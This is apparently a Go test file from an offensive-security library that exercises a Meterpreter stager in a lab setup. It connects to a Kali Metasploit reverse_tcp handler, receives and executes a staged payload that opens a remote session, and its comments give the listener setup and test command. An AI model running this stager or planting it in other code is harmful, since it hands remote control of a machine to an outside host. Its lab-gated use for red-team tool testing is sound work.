//go:build linux

package meterpreter

import (
	"context"
	"os"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/testutil"
)

// TestMeterpreterRealSessionLinux stages a real Linux Meterpreter ELF payload
// over TCP via a Kali handler and verifies that the staging protocol works.
//
// The MSF handler must be started externally before running this test:
//
//	# From the host (KaliSSH uses port-forwarded localhost:2223):
//	testutil.KaliStartListener(t, "linux/x64/meterpreter/reverse_tcp", "0.0.0.0", "4444")
//
// Then run on the Ubuntu VM:
//
//	MALDEV_MANUAL=1 MALDEV_INTRUSIVE=1 MALDEV_KALI_HOST=192.168.56.200 \
//	  go test -v -run TestMeterpreterRealSessionLinux ./c2/meterpreter/
//
// The test connects to the handler, receives the 126-byte wrapper, and runs
// the staging protocol. On success, Stage() blocks forever (wrapper takes
// control of the thread). The host can verify the session via KaliCheckSession.
func TestMeterpreterRealSessionLinux(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)

	kaliHost := os.Getenv("MALDEV_KALI_HOST")
	if kaliHost == "" {
		kaliHost = testutil.KaliHost
	}

	port := os.Getenv("MALDEV_KALI_PORT")
	if port == "" {
		port = "4444"
	}

	stager := NewStager(&Config{
		Transport: TCP,
		Host:      kaliHost,
		Port:      port,
		Timeout:   30 * time.Second,
	})

	ctx := context.Background()
	done := make(chan error, 1)
	go func() {
		done <- stager.Stage(ctx)
	}()

	// Wait for staging: wrapper (126 bytes) + ELF load + session init.
	t.Logf("Stager connecting to %s:%s, waiting 20s for session...", kaliHost, port)
	time.Sleep(20 * time.Second)

	select {
	case err := <-done:
		// Stage returned = error (success blocks forever).
		require.NoError(t, err, "Stage() returned an error")
		t.Fatal("Stage() returned unexpectedly (should block on success)")
	default:
		t.Log("Stage() still running — wrapper took over, session likely established")
	}
}
